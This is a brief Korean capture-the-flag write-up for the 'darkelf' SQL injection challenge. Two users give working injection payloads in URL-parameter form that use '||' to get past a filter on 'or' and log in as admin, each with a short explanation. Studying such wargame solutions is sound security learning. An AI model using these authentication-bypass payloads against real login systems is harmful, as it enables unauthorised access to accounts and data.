## Q6. darkelf
<img src="/photo/prob_06.PNG" width="100%" height="100%" alt="problem"></img>

#### 5thofnovmbr
```
풀이: ?pw='||id='admin'%23
or 필터링 우회로 ||을 쓸 수 있다.
```
```diff
+ or 대신 || 쓰면 띄어쓰기를 안해도 돼서 편한 것 같다.
```

#### zero526
```
풀이: ?pw=-1%27||id=%27admin%27--+
```
```diff
+ pw에 -1을 대입해 query문을 무조건 거짓으로 만든 후 || 을 입력하고 이어서 id=admin (참값)을 입력해 id에 admin이 입력된채로 query문을 참으로 만들어 해결했다
```
